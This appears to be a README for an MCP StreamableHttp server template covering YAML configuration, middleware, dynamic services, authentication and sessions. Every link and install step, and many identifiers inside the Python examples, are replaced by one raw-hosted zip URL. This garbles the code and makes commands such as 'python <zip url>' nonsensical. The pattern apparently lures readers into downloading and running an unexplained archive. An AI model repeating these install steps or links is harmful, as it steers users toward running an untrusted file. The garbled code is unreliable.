# mcp-streamable-http-server

![mcp-streamable-http-server](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip)  
[![Release Version](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip)](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip)

Welcome to the **mcp-streamable-http-server** repository! This project offers a comprehensive development template for creating StreamableHttp services. It emphasizes flexible authentication, dynamic service registration, customizable middleware, and easy tool configuration through YAML files.

## Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Getting Started](#getting-started)
4. [Usage](#usage)
5. [Configuration](#configuration)
6. [Middleware](#middleware)
7. [Dynamic Services](#dynamic-services)
8. [Authentication](#authentication)
9. [Session Management](#session-management)
10. [Contributing](#contributing)
11. [License](#license)
12. [Contact](#contact)

## Features

- **Flexible Authentication**: Implement various authentication methods easily.
- **Dynamic Service Registration**: Register and deregister services on-the-fly.
- **Customizable Middleware**: Add or modify middleware to suit your needs.
- **YAML Configuration**: Use YAML files for straightforward configuration.
- **Built with Starlette**: Leverage the power of the Starlette framework for performance and scalability.

## Installation

To get started with the mcp-streamable-http-server, clone the repository and install the required dependencies.

```bash
git clone https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip
cd mcp-streamable-http-server
pip install -r https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip
```

## Getting Started

After installing the project, you can start building your StreamableHttp services. 

1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip).
2. **Execute the server** by running:

```bash
python https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip
```

This will start your server, ready to handle requests.

## Usage

You can create a basic service by defining it in a YAML configuration file. Here is a simple example:

```yaml
services:
  my_service:
    path: /my_service
    methods: [GET, POST]
    auth: true
```

## Configuration

The configuration is done using YAML files. You can define services, middleware, and authentication methods in a structured way. Here’s an example configuration:

```yaml
services:
  example_service:
    path: /example
    methods: [GET]
    middleware:
      - log_request
      - authenticate
```

### YAML Configuration File Structure

- **services**: Define all your services here.
- **path**: The endpoint path for your service.
- **methods**: Allowed HTTP methods.
- **middleware**: List of middleware to apply.

## Middleware

Middleware allows you to process requests before they reach your service. You can create custom middleware or use built-in options.

### Example of Custom Middleware

```python
from https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip import BaseHTTPMiddleware

class LogRequestMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        print(f"Request: {https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip} {https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip}")
        response = await call_next(request)
        return response
```

## Dynamic Services

Dynamic service registration allows you to add or remove services at runtime. This feature is essential for applications that require scalability and flexibility.

### Example of Dynamic Registration

```python
https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip("startup")
async def startup_event():
    https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip("/dynamic_service", dynamic_service, methods=["GET"])

async def dynamic_service(request):
    return JSONResponse({"message": "This is a dynamic service!"})
```

## Authentication

The mcp-streamable-http-server supports various authentication methods. You can easily implement token-based or session-based authentication.

### Example of Token Authentication

```python
from fastapi import Depends, HTTPException, status

def token_auth(token: str = Depends(oauth2_scheme)):
    if token != "expected_token":
        raise HTTPException(https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip, detail="Invalid token")
```

## Session Management

Session management is crucial for maintaining user states. You can implement session storage using various backends, including in-memory or database storage.

### Example of Session Management

```python
from https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip import SessionMiddleware

https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip(SessionMiddleware, secret_key="your_secret_key")
```

## Contributing

We welcome contributions to improve the mcp-streamable-http-server. Please follow these steps:

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Submit a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or suggestions, please reach out via GitHub issues or contact the repository owner.

---

For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/nunaszek/mcp-streamable-http-server/main/server/tool/server-mcp-streamable-http-1.6.zip). Download the latest version and start building your StreamableHttp services today!